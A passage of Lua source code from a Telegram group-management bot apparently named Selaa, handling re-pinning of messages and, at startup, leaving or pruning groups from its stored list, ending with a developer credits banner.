if msg.content_.animation_.animation_.persistent_id_ == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) Selaa:del(Selaa..'Selaa:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) Selaa:del(Selaa..'Selaa:PinnedMsgs'..msg.chat_id_) end,nil)   
end end end
--     Source Selaa     --
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then
print('\27[30;32mجاري تنظيف المجموعات الوهميه يرجى الانتظار\n\27[1;37m')
local PvList = Selaa:smembers(Selaa..'Selaa:Users')  
for k,v in pairs(PvList) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end 
local GpList = Selaa:smembers(Selaa..'Selaa:Groups') 
for k,v in pairs(GpList) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
tdcli_function({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=Selaa,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
Selaa:srem(Selaa..'Selaa:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
Selaa:srem(Selaa..'Selaa:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
Selaa:srem(Selaa..'Selaa:Groups',v)  
end
if data and data.code_ and data.code_ == 400 then
Selaa:srem(Selaa..'Selaa:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
Selaa:sadd(Selaa..'Selaa:Groups',v)  
end end,nil) end
end
--     Source Selaa     --
end 
------------------------------------------------
-- This Source Was Developed By (Selaa) @IE_S9.--
--   This Is The Source Channel @sourcesela .   --
--                - Selaa -                 --
--        -- https://t.me/sourcesela --         --
------------------------------------------------ 
